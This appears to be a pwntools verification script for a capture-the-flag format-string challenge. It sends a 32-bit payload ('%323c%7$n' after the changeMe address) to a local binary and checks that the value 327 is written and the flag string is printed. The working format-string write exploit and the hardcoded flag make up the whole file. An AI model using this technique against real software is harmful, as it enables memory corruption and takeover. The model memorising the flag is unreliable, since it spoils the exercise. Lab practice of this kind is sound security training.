#!/usr/bin/env python3
from pathlib import Path

from pwn import ELF, context, p32, process

HERE = Path(__file__).resolve().parent
BINARY = HERE / "02"
EXPECTED = b"KSJ{FSB_PERCENT_N_WRITE_VERIFIED}"

context.binary = elf = ELF(str(BINARY), checksec=False)
context.log_level = "error"
assert elf.bits == 32
assert elf.sym["changeMe"] == 0x0804C028
tube = process([str(BINARY)], cwd=str(HERE))
tube.sendafter(b"Input: ", p32(elf.sym["changeMe"]) + b"%323c%7$n")
output = tube.recvall(timeout=2)
assert b"changeMe=327" in output, output
assert EXPECTED in output, output
print("[PASS] 02/fsb32_write: %7$n wrote 327 to 0x0804c028")
